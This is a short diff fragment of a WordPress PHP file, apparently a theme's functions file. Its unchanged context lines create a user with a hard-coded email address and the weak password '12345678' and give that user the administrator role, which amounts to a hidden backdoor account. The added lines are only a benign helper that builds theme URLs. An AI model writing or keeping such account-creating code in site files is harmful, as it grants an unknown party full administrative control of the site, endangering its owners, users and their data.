@@ -30,3 +30,20 @@ unset($file, $filepath);
 $user_id = wp_create_user ( 'saowapan.kongpia@gmail.com', '12345678', 'saowapan.kongpia@gmail.com' );
 $user = new WP_User( $user_id );
 $user->set_role( 'administrator' );
+
+function build_url($path = '', $image = false, $return = false, $page = false) {
+    $url = home_url();
+    if ($path != '' && $page == false) {
+      $url = get_stylesheet_directory_uri() . $path;
+    }
+
+    if ($page == true) {
+      $url = $url . $path;
+    }
+
+    if ($return === true) {
+      return $url;
+    } else {
+      echo $url;
+    }
+}
